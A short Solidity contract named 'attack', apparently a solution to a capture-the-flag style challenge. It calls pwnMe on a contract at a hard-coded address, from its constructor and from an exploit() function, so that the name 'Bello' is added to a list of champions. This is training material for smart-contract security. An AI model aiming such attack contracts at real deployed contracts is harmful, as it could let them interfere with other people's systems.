//SPDX-License-Identifier: MIT
// To overcome this challenge, append your name to the array of champions.

pragma solidity ^0.8.17; 

import "./IRoot.sol";

contract attack{
    IRoot public root;

    constructor(){
        root = IRoot(0x174824ebf59ec8aAE10C7d8776d8d59E538a68F1);
        root.pwnMe("Bello");

    }

    function exploit() public  {
        root.pwnMe("Bello");
    }
}